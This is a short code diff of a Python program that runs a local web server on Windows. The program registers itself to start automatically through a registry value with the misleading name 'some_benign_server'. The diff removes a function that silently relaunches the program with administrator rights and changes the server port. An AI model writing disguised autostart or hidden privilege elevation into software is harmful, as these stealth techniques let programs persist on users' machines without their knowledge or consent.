@@ -82,31 +82,18 @@ def persistence():
         reg.SetValueEx(open_,"some_benign_server",0,reg.REG_SZ,current_path)
         reg.CloseKey(open_)
 
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
 
-
-def check_if_admin():
-    if not is_admin():
-        print(" ".join(sys.argv))
-        params = " ".join(sys.argv)
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
-        sys.exit()
 
 def main():
-    #check_if_admin()
     #ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "server_main_pid", 1)
-    uvicorn.run("main:app", port=443, host='127.0.0.1', reload = True)
+    uvicorn.run("main:app", port=8075, host='127.0.0.1', reload = True)
 
 
 
 
 
 if __name__ == "__main__":
-    ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "server", 1)
+    #ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "server", 1)
     #uvicorn.run(app, host="127.0.0.1", port=8075)
     persistence()
     print(f'server main pid: {str(os.getpid())}')
